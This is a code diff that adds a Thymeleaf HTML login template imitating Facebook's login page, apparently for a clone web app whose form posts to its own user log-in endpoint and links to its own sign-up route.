@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- <link rel="stylesheet" type="text/css" th:href="@{/css/style.css}">
+    <link rel="stylesheet" type="text/css" th:href="@{/css/login.css}"> -->
+    <!-- <link rel="stylesheet" type="text/css" href="/css/style.css"> -->
+    <link rel="stylesheet" type="text/css" th:href="@{/css/login.css}">
+
+    <title>Facebook Login</title>
+</head>
+<body>
+<div class="wrapper">
+    <div class="item item1">
+        <div class="fb">facebook</div>
+        <div class="text1">
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+    </div>
+    <div class="item item2">
+
+        <div class="lgform">
+
+            <form th:action="@{/api/v1/user/log-in}" method="post">
+                <input type="text" name="email" id="email" placeholder="Email address or phone number" required><br><br>
+                <input type="password" name="password" id="password" placeholder="Password" required><br><br>
+                <input type="submit" value="Log in" id="lgbtn"><br><br>
+            </form>
+            <div class="forgetpw">Forgotten password?</div>
+            <a href="/api/v1/user/sign-up"><input type="submit" value="Create New Account" id="cracc"></a>
+
+
+        </div>
+    </div>
+
+</div>
+
+</body>
+</html>
